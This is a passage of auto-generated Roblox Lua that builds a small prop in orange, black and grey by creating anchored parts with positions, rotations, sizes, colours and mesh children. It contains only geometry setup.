o74.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o74.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o74.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o74.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o74.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o74.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o74.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o75 = Instance.new("BlockMesh")
o75.Parent = o74
o75.Scale = Vector3.new(0.916666687, 1, 0.75)
o76 = Instance.new("Part")
o76.Parent = o1
o76.Material = Enum.Material.SmoothPlastic
o76.BrickColor = BrickColor.new("Neon orange")
o76.Position = Vector3.new(-113.539955, 1.48563385, 61.3499832)
o76.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o76.Anchored = true
o76.CFrame = CFrame.new(-113.539955, 1.48563385, 61.3499832, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o76.FormFactor = Enum.FormFactor.Custom
o76.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o76.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o76.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o76.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o76.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o76.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o76.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o76.Color = Color3.new(0.835294, 0.45098, 0.239216)
o77 = Instance.new("BlockMesh")
o77.Parent = o76
o77.Scale = Vector3.new(0.916666687, 0.416666687, 0.25)
o78 = Instance.new("Part")
o78.Parent = o1
o78.Material = Enum.Material.SmoothPlastic
o78.BrickColor = BrickColor.new("Really black")
o78.Position = Vector3.new(-113.539955, 1.09897149, 59.8350143)
o78.Rotation = Vector3.new(-119.999992, 5.93669711e-006, -1.54809596e-010)
o78.Anchored = true
o78.CFrame = CFrame.new(-113.539955, 1.09897149, 59.8350143, 1, 2.7019372e-012, 1.03614909e-007, -8.97317989e-008, -0.499999911, 0.866025507, 5.18097814e-008, -0.866025507, -0.499999911)
o78.FormFactor = Enum.FormFactor.Custom
o78.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o78.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o78.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o78.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o78.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o78.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o78.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o78.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o79 = Instance.new("SpecialMesh")
o79.Parent = o78
o79.Scale = Vector3.new(0.166666672, 0.166666672, 0.416666687)
o79.MeshType = Enum.MeshType.Wedge
o80 = Instance.new("Part")
o80.Parent = o1
o80.Material = Enum.Material.SmoothPlastic
o80.BrickColor = BrickColor.new("Neon orange")
o80.Position = Vector3.new(-113.5373, 1.04512715, 58.2646141)
o80.Rotation = Vector3.new(2.50447852e-006, 2.50457879e-006, 4.2913037e-010)
o80.Anchored = true
o80.CFrame = CFrame.new(-113.5373, 1.04512715, 58.2646141, 1, -7.489738e-012, 4.37131469e-008, 8.24089842e-012, 0.999991596, -4.37110295e-008, -4.3712955e-008, 4.37110295e-008, 0.999991596)
o80.CanCollide = false
o80.FormFactor = Enum.FormFactor.Symmetric
o80.Size = Vector3.new(1, 1, 1)
o80.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o80.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o80.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o80.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o80.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o80.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o80.Color = Color3.new(0.835294, 0.45098, 0.239216)
o81 = Instance.new("BlockMesh")
o81.Parent = o80
o81.Scale = Vector3.new(0.192307696, 0.269230783, 0.653846145)
o82 = Instance.new("Part")
o82.Parent = o1
o82.Material = Enum.Material.SmoothPlastic
o82.BrickColor = BrickColor.new("Neon orange")
o82.Position = Vector3.new(-113.539955, 1.50229883, 61.3999901)
o82.Rotation = Vector3.new(-90, -5.61757252e-010, -180)
o82.Anchored = true
o82.CFrame = CFrame.new(-113.539955, 1.50229883, 61.3999901, -1, 2.14582128e-012, -9.80451397e-012, -9.80451397e-012, -1.04308192e-007, 1, 2.14582041e-012, 1, 1.04308192e-007)
o82.FormFactor = Enum.FormFactor.Custom
o82.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o82.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o82.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o82.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o82.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o82.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o82.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o82.Color = Color3.new(0.835294, 0.45098, 0.239216)
o83 = Instance.new("SpecialMesh")
o83.Parent = o82
o83.Scale = Vector3.new(0.916666687, 0.0833333358, 0.0833333358)
o83.MeshType = Enum.MeshType.Wedge
o84 = Instance.new("Part")
o84.Parent = o1
o84.Material = Enum.Material.SmoothPlastic
o84.BrickColor = BrickColor.new("Really black")
o84.Position = Vector3.new(-113.539955, 1.6573081, 60.983326)
o84.Rotation = Vector3.new(90.0000076, 5.29337331e-006, -180)
o84.Anchored = true
o84.CFrame = CFrame.new(-113.539955, 1.6573081, 60.983326, -1, 1.50991141e-007, 9.23867916e-008, -9.2386756e-008, 1.93715223e-007, -1, -1.50991141e-007, -1, -1.93715223e-007)
o84.FormFactor = Enum.FormFactor.Custom
o84.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o84.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o84.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o84.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o84.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o84.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o84.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o84.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o85 = Instance.new("BlockMesh")
o85.Parent = o84
o85.Scale = Vector3.new(0.666666687, 0.25, 0.25)
o86 = Instance.new("Part")
o86.Parent = o1
o86.Material = Enum.Material.SmoothPlastic
o86.BrickColor = BrickColor.new("Dark stone grey")
o86.Position = Vector3.new(-113.539955, 1.61896086, 61.0416603)
o86.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o86.Anchored = true
o86.CFrame = CFrame.new(-113.539955, 1.61896086, 61.0416603, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o86.FormFactor = Enum.FormFactor.Custom
o86.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o86.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o86.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o86.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o86.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o86.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o86.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o86.Color = Color3.new(0.388235, 0.372549, 0.384314)
o87 = Instance.new("BlockMesh")
o87.Parent = o86
o87.Scale = Vector3.new(0.25, 0.333333343, 0.25)
o88 = Instance.new("Part")
o88.Parent = o1
o88.Material = Enum.Material.SmoothPlastic
o88.BrickColor = BrickColor.new("Really black")
o88.Position = Vector3.new(-113.569962, 1.69896829, 63.7049255)
o88.Rotation = Vector3.new(-90, 24.9996357, -2.59040348e-007)
o88.Anchored = true
o88.CFrame = CFrame.new(-113.569962, 1.69896829, 63.7049255, 0.906310558, 4.09752721e-009, 0.422612488, -0.422612458, 1.3219902e-007, 0.906310558, -5.21553183e-008, -1, 1.21545028e-007)
o88.FormFactor = Enum.FormFactor.Custom
o88.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o88.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o88.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o88.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o88.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o88.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o88.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o88.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o89 = Instance.new("BlockMesh")
o89.Parent = o88
o89.Scale = Vector3.new(0.0416666679, 0.333333343, 0.166666672)
o90 = Instance.new("Part")
o90.Parent = o1
o90.Material = Enum.Material.SmoothPlastic
o90.BrickColor = BrickColor.new("Really black")
o90.Position = Vector3.new(-113.639954, 1.38396943, 59.6916847)
o90.Rotation = Vector3.new(-89.9999924, -5.20461618e-010, 90)
o90.Anchored = true
o90.CFrame = CFrame.new(-113.639954, 1.38396943, 59.6916847, 7.54973826e-008, -1, -9.08376846e-012, 2.23517574e-007, -9.06689307e-012, 1, -1, -7.54973826e-008, 2.23517588e-007)
o90.FormFactor = Enum.FormFactor.Custom
o90.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o90.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o90.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o90.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o90.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o90.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o90.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o90.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o91 = Instance.new("CylinderMesh")
o91.Parent = o90
o91.Scale = Vector3.new(0.666666687, 0.0833333358, 0.666666687)
o92 = Instance.new("Part")
o92.Parent = o1
o92.Material = Enum.Material.SmoothPlastic
o92.BrickColor = BrickColor.new("Really black")
o92.Position = Vector3.new(-113.48996, 1.68949139, 60.6720581)
o92.Rotation = Vector3.new(92.0000153, 5.39824214e-006, -180)
o92.Anchored = true
o92.CFrame = CFrame.new(-113.48996, 1.68949139, 60.6720581, -1, 1.50990815e-007, 9.42170999e-008, -8.88901752e-008, 0.0348996483, -0.999390841, -1.54186978e-007, -0.999390841, -0.0348996483)
o92.FormFactor = Enum.FormFactor.Custom
o92.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o92.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o92.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o92.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o92.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o92.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o92.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o92.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o93 = Instance.new("BlockMesh")
o93.Parent = o92
o93.Scale = Vector3.new(0.333333343, 0.0833333358, 0.166666672)
o94 = Instance.new("Part")
o94.Parent = o1
o94.Material = Enum.Material.SmoothPlastic
o94.BrickColor = BrickColor.new("Really black")
o94.Position = Vector3.new(-113.539955, 1.52947271, 63.6085854)
o94.Rotation = Vector3.new(-59.9999962, -3.89844712e-010, 3.66455755e-010)
o94.Anchored = true
o94.CFrame = CFrame.new(-113.539955, 1.52947271, 63.6085854, 1, -6.39585954e-012, -6.8040738e-012, 9.0904298e-012, 0.500000119, 0.866025388, -2.13693885e-012, -0.866025388, 0.500000119)
o94.FormFactor = Enum.FormFactor.Custom
o94.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o94.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o94.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o94.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o94.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o94.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o94.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o94.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o95 = Instance.new("BlockMesh")
o95.Parent = o94
o95.Scale = Vector3.new(0.333333343, 0.0833333358, 0.583333313)
o96 = Instance.new("Part")
o96.Parent = o1
o96.Material = Enum.Material.SmoothPlastic
o96.BrickColor = BrickColor.new("Neon orange")
o96.Position = Vector3.new(-113.5373, 1.04512715, 58.7069168)
o96.Rotation = Vector3.new(-180, -2.50457879e-006, -4.2913037e-010)
o96.Anchored = true
o96.CFrame = CFrame.new(-113.5373, 1.04512715, 58.7069168, 1, 7.489738e-012, -4.37131469e-008, 8.24089842e-012, -0.999991596, 4.37110295e-008, -4.3712955e-008, -4.37110295e-008, -0.999991596)
o96.CanCollide = false
o96.FormFactor = Enum.FormFactor.Symmetric
o96.Size = Vector3.new(1, 1, 1)
o96.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o96.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o96.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o96.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o96.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o96.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o96.Color = Color3.new(0.835294, 0.45098, 0.239216)
o97 = Instance.new("SpecialMesh")
o97.Parent = o96
o97.Scale = Vector3.new(0.192307696, 0.269230783, 0.230769232)
o97.MeshType = Enum.MeshType.Wedge
o98 = Instance.new("Part")
o98.Parent = o1
o98.Material = Enum.Material.SmoothPlastic
o98.BrickColor = BrickColor.new("Neon orange")
o98.Position = Vector3.new(-113.5373, 1.23742986, 58.3800011)
o98.Rotation = Vector3.new(2.50447852e-006, 2.50457879e-006, 4.2913037e-010)
o98.Anchored = true
o98.CFrame = CFrame.new(-113.5373, 1.23742986, 58.3800011, 1, -7.489738e-012, 4.37131469e-008, 8.24089842e-012, 0.999991596, -4.37110295e-008, -4.3712955e-008, 4.37110295e-008, 0.999991596)
o98.CanCollide = false
o98.FormFactor = Enum.FormFactor.Symmetric
o98.Size = Vector3.new(1, 1, 1)
o98.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o98.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o98.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o98.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o98.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o98.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o98.Color = Color3.new(0.835294, 0.45098, 0.239216)
o99 = Instance.new("BlockMesh")
o99.Parent = o98
o99.Scale = Vector3.new(0.192307696, 0.115384616, 0.884615362)
o100 = Instance.new("Part")
o100.Parent = o1
o100.Material = Enum.Material.SmoothPlastic
o100.BrickColor = BrickColor.new("Dark stone grey")
o100.Position = Vector3.new(-113.539955, 1.33564579, 59.3583641)
o100.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o100.Anchored = true
o100.CFrame = CFrame.new(-113.539955, 1.33564579, 59.3583641, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o100.FormFactor = Enum.FormFactor.Custom
o100.Size = Vector3.new(0.200000003, 0.200000003, 0.216666669)
o100.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o100.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o100.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o100.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o100.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o100.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o100.Color = Color3.new(0.388235, 0.372549, 0.384314)
o101 = Instance.new("BlockMesh")
o101.Parent = o100
o101.Scale = Vector3.new(0.833333373, 0.5, 1)
o102 = Instance.new("Part")
o102.Parent = o1
o102.Material = Enum.Material.SmoothPlastic
o102.BrickColor = BrickColor.new("Really black")
o102.Position = Vector3.new(-113.539955, 1.41896677, 61.7166557)
o102.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o102.Anchored = true
o102.CFrame = CFrame.new(-113.539955, 1.41896677, 61.7166557, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o102.FormFactor = Enum.FormFactor.Custom
o102.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o102.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o102.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o102.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o102.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o102.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o102.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o102.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o103 = Instance.new("CylinderMesh")
o103.Parent = o102
o103.Scale = Vector3.new(0.583333313, 0.25, 0.583333313)
o104 = Instance.new("Part")
o104.Parent = o1
o104.Material = Enum.Material.SmoothPlastic
o104.BrickColor = BrickColor.new("Really black")
o104.Position = Vector3.new(-113.539955, 1.41896856, 63.2416458)
o104.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o104.Anchored = true
o104.CFrame = CFrame.new(-113.539955, 1.41896856, 63.2416458, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o104.FormFactor = Enum.FormFactor.Custom
o104.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o104.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o104.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o104.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o104.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o104.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o104.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o104.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o105 = Instance.new("CylinderMesh")
o105.Parent = o104
o105.Scale = Vector3.new(0.5, 1, 0.5)
o106 = Instance.new("Part")
o106.Parent = o1
o106.Material = Enum.Material.SmoothPlastic
o106.BrickColor = BrickColor.new("Really black")
o106.Position = Vector3.new(-113.539955, 1.37730253, 63.4383125)
o106.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o106.Anchored = true
o106.CFrame = CFrame.new(-113.539955, 1.37730253, 63.4383125, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o106.FormFactor = Enum.FormFactor.Custom
o106.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o106.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o106.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o106.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o106.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o106.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o106.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o106.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o107 = Instance.new("BlockMesh")
o107.Parent = o106
o107.Scale = Vector3.new(0.166666672, 0.5, 0.333333343)
o108 = Instance.new("Part")
o108.Parent = o1
o108.Material = Enum.Material.SmoothPlastic
o108.BrickColor = BrickColor.new("Really black")
o108.Position = Vector3.new(-113.539955, 1.18563902, 60.0650139)
o108.Rotation = Vector3.new(-89.9999924, -5.91999378e-006, 180)
o108.Anchored = true
o108.CFrame = CFrame.new(-113.539955, 1.18563902, 60.0650139, -1, -1.50991156e-007, -1.0332338e-007, -1.03323345e-007, -2.23517574e-007, 1, -1.5099117e-007, 1, 2.23517574e-007)
o108.FormFactor = Enum.FormFactor.Custom
o108.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o108.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o108.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o108.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o108.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o108.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o108.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o108.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o109 = Instance.new("BlockMesh")
o109.Parent = o108
o109.Scale = Vector3.new(0.833333373, 0.5, 0.916666687)
o110 = Instance.new("Part")
o110.Parent = o1
o110.Material = Enum.Material.SmoothPlastic
o110.BrickColor = BrickColor.new("Neon orange")
o110.Position = Vector3.new(-113.514954, 1.57730913, 61.6666527)
o110.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o110.Anchored = true
o110.CFrame = CFrame.new(-113.514954, 1.57730913, 61.6666527, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o110.FormFactor = Enum.FormFactor.Custom
o110.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o110.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o110.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o110.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o110.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o110.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o110.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o110.Color = Color3.new(0.835294, 0.45098, 0.239216)
o111 = Instance.new("CylinderMesh")
o111.Parent = o110
o111.Scale = Vector3.new(0.666666687, 0.25, 0.666666687)
o112 = Instance.new("Part")
o112.Parent = o1
o112.Material = Enum.Material.SmoothPlastic
o112.BrickColor = BrickColor.new("Really black")
o112.Position = Vector3.new(-113.539955, 1.56063223, 61.9083138)
o112.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o112.Anchored = true
o112.CFrame = CFrame.new(-113.539955, 1.56063223, 61.9083138, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o112.FormFactor = Enum.FormFactor.Custom
o112.Size = Vector3.new(0.200000003, 0.433333337, 0.200000003)
o112.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o112.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o112.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o112.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o112.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o112.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o112.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o113 = Instance.new("CylinderMesh")
o113.Parent = o112
o113.Scale = Vector3.new(0.333333343, 1, 0.333333343)
o114 = Instance.new("Part")
o114.Parent = o1
o114.Material = Enum.Material.SmoothPlastic
o114.BrickColor = BrickColor.new("Really black")
o114.Position = Vector3.new(-113.539955, 1.20231974, 59.5666847)
o114.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o114.Anchored = true
o114.CFrame = CFrame.new(-113.539955, 1.20231974, 59.5666847, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o114.FormFactor = Enum.FormFactor.Custom
o114.Size = Vector3.new(0.200000003, 0.316666663, 0.200000003)
o114.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o114.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o114.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o114.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o114.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o114.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o114.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o115 = Instance.new("BlockMesh")
o115.Parent = o114
o115.Scale = Vector3.new(0.833333373, 1, 0.583333313)
o116 = Instance.new("Part")
o116.Parent = o1
o116.Material = Enum.Material.SmoothPlastic
o116.BrickColor = BrickColor.new("Neon orange")
o116.Position = Vector3.new(-113.539955, 1.43563318, 61.6666527)
o116.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o116.Anchored = true
o116.CFrame = CFrame.new(-113.539955, 1.43563318, 61.6666527, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o116.FormFactor = Enum.FormFactor.Custom
o116.Size = Vector3.new(0.200000003, 0.200000003, 0.283333331)
o116.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o116.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o116.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o116.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o116.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o116.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o116.Color = Color3.new(0.835294, 0.45098, 0.239216)
o117 = Instance.new("BlockMesh")
o117.Parent = o116
o117.Scale = Vector3.new(0.916666687, 0.25, 1)
o118 = Instance.new("Part")
o118.Parent = o1
o118.Material = Enum.Material.SmoothPlastic
o118.BrickColor = BrickColor.new("Really black")
o118.Position = Vector3.new(-113.48996, 1.67825508, 60.750042)
o118.Rotation = Vector3.new(-87.9999847, -2.80858876e-006, 90)
o118.Anchored = true
o118.CFrame = CFrame.new(-113.48996, 1.67825508, 60.750042, -4.37141736e-008, -1, -4.90191212e-008, 0.0348996781, -5.0514867e-008, 0.999390841, -0.999390841, 4.197679e-008, 0.0348996781)
o118.FormFactor = Enum.FormFactor.Custom
o118.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
o118.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o118.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o118.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o118.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o118.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o118.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o118.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
o119 = Instance.new("CylinderMesh")
o119.Parent = o118
o119.Scale = Vector3.new(0.25, 0.333333343, 0.25)
o120 = Instance.new("Part")
o120.Parent = o1
o120.Material = Enum.Material.SmoothPlastic
o120.BrickColor = BrickColor.new("Neon orange")
o120.Position = Vector3.new(-113.539955, 1.61896086, 61.3583183)
o120.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o120.Anchored = true
o120.CFrame = CFrame.new(-113.539955, 1.61896086, 61.3583183, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o120.FormFactor = Enum.FormFactor.Custom
o120.Size = Vector3.new(0.200000003, 0.566666663, 0.200000003)
o120.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o120.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o120.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o120.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o120.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o120.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o120.Color = Color3.new(0.835294, 0.45098, 0.239216)
o121 = Instance.new("BlockMesh")
o121.Parent = o120
o121.Scale = Vector3.new(0.25, 1, 0.25)
o122 = Instance.new("Part")
o122.Parent = o1
o122.Material = Enum.Material.SmoothPlastic
o122.BrickColor = BrickColor.new("Neon orange")
o122.Position = Vector3.new(-113.514954, 1.57731104, 61.3583183)
o122.Rotation = Vector3.new(-90, -5.20843257e-010, 1.22437671e-010)
o122.Anchored = true
o122.CFrame = CFrame.new(-113.514954, 1.57731104, 61.3583183, 1, -2.13694036e-012, -9.0904298e-012, 9.0904298e-012, 1.34110536e-007, 1, -2.13693885e-012, -1, 1.3411055e-007)
o122.FormFactor = Enum.FormFactor.Custom
o122.Size = Vector3.new(0.200000003, 0.566666663, 0.200000003)
o122.BackSurface = Enum.SurfaceType.SmoothNoOutlines
o122.BottomSurface = Enum.SurfaceType.SmoothNoOutlines
o122.FrontSurface = Enum.SurfaceType.SmoothNoOutlines
o122.LeftSurface = Enum.SurfaceType.SmoothNoOutlines
o122.RightSurface = Enum.SurfaceType.SmoothNoOutlines
o122.TopSurface = Enum.SurfaceType.SmoothNoOutlines
o122.Color = Color3.new(0.835294, 0.45098, 0.239216)
o123 = Instance.new("CylinderMesh")
o123.Parent = o122
o123.Scale = Vector3.new(0.666666687, 1, 0.666666687)
o124 = Instance.new("Part")
o124.Parent = o1
o124.Material = Enum.Material.SmoothPlastic
o124.BrickColor = BrickColor.new("Really black")
o124.Position = Vector3.new(-113.539955, 1.51565146, 59.4416924)
o124.Rotation = Vector3.new(112.000015, 5.29329009e-006, -180)
o124.Anchored = true
o124.CFrame = CFrame.new(-113.539955, 1.51565146, 59.4416924, -1, 1.50987916e-007, 9.2385342e-008, -2.90970945e-008, 0.374606788, -0.927183807, -1.74601695e-007, -0.927183807, -0.374606788)
o124.FormFactor = Enum.FormFactor.Custom
o124.Size = Vector3.new(0.200000003, 0.200000003, 0.200000003)
